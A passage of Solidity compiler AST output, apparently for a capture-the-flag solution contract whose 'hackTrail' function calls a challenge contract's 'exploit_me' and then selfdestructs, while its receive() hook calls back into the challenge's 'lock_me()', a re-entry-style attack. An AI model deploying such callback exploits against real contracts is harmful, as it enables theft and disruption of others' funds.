														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 95,
														"name": "IChallenge",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 10,
														"src": "1170:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_contract$_IChallenge_$10_$",
															"typeString": "type(contract IChallenge)"
														}
													},
													"id": 97,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1170:25:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_IChallenge_$10",
														"typeString": "contract IChallenge"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1147:48:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "307837393833343945303663363732373234363531323342393162643838433564313962386337383738",
																	"id": 104,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1235:42:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	"value": "0x798349E06c67272465123B91bd88C5d19b8c7878"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 103,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1227:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 102,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1227:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 105,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1227:51:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"id": 99,
															"name": "challenge",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 94,
															"src": "1206:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IChallenge_$10",
																"typeString": "contract IChallenge"
															}
														},
														"id": 101,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "exploit_me",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 6,
														"src": "1206:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
															"typeString": "function (address) external"
														}
													},
													"id": 106,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1206:73:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 107,
												"nodeType": "ExpressionStatement",
												"src": "1206:73:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "307837393833343945303663363732373234363531323342393162643838433564313962386337383738",
																	"id": 111,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1311:42:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	"value": "0x798349E06c67272465123B91bd88C5d19b8c7878"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 110,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1303:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 109,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1303:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {}
																}
															},
															"id": 112,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1303:51:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 108,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967275,
														"src": "1290:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 113,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1290:65:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 114,
												"nodeType": "ExpressionStatement",
												"src": "1290:65:0"
											}
										]
									},
									"functionSelector": "157bca60",
									"id": 116,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"id": 90,
											"kind": "modifierInvocation",
											"modifierName": {
												"id": 89,
												"name": "onlyRoki",
												"nodeType": "IdentifierPath",
												"referencedDeclaration": 87,
												"src": "1127:8:0"
											},
											"nodeType": "ModifierInvocation",
											"src": "1127:8:0"
										}
									],
									"name": "hackTrail",
									"nameLocation": "1106:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 88,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1115:2:0"
									},
									"returnParameters": {
										"id": 91,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1136:0:0"
									},
									"scope": 139,
									"src": "1097:266:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 137,
										"nodeType": "Block",
										"src": "1398:108:0",
										"statements": [
											{
												"assignments": [
													120,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 120,
														"mutability": "mutable",
														"name": "success",
														"nameLocation": "1415:7:0",
														"nodeType": "VariableDeclaration",
														"scope": 137,
														"src": "1410:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 119,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1410:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													},
													null
												],
												"id": 136,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"hexValue": "6c6f636b5f6d652829",
																					"id": 131,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "string",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "1483:11:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_stringliteral_4c228cc7776ff09193dddeaa40b26ebd5d18d89e2b6e01adf9e9d8bfc40dcb16",
																						"typeString": "literal_string \"lock_me()\""
																					},
																					"value": "lock_me()"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_stringliteral_4c228cc7776ff09193dddeaa40b26ebd5d18d89e2b6e01adf9e9d8bfc40dcb16",
																						"typeString": "literal_string \"lock_me()\""
																					}
																				],
																				"id": 130,
																				"name": "keccak256",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967288,
																				"src": "1473:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																					"typeString": "function (bytes memory) pure returns (bytes32)"
																				}
																			},
																			"id": 132,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1473:22:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		],
																		"id": 129,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1466:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes4_$",
																			"typeString": "type(bytes4)"
																		},
																		"typeName": {
																			"id": 128,
																			"name": "bytes4",
																			"nodeType": "ElementaryTypeName",
																			"src": "1466:6:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 133,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1466:30:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	}
																],
																"expression": {
																	"id": 126,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967295,
																	"src": "1455:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 127,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encode",
																"nodeType": "MemberAccess",
																"src": "1455:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 134,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1455:42:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 123,
																	"name": "challengeAddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 72,
																	"src": "1435:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 122,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1427:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 121,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1427:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 124,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1427:22:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 125,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"src": "1427:27:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 135,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1427:71:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1409:89:0"
											}
										]
									},
									"id": 138,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 117,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1378:2:0"
									},
									"returnParameters": {
										"id": 118,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1398:0:0"
									},
									"scope": 139,
									"src": "1371:135:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 140,
							"src": "808:701:0",
							"usedErrors": []
						}
					],
					"src": "0:1509:0"
				},
				"id": 0
			}
		}
	}
}